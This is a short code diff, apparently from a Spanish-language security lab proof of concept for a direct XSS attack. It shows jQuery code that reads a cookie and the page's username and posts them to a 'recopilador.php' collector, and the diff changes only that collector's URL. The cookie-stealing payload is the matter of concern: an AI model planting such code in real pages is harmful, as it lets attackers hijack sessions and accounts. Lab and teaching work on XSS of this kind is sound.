@@ -4,7 +4,7 @@ $(document).ready(function(){
 	var usuario = $("#nombre_usuario").html().trim();
 	$.ajax({
 		type:"post",
-		url:"http://localhost/LabSis/poc/xss_directo/cracker/recopilador.php",
+		url:"localhost/receptor/recopilador.php",
 		data:{
 			"cookie":cookie,
 			"usuario":usuario
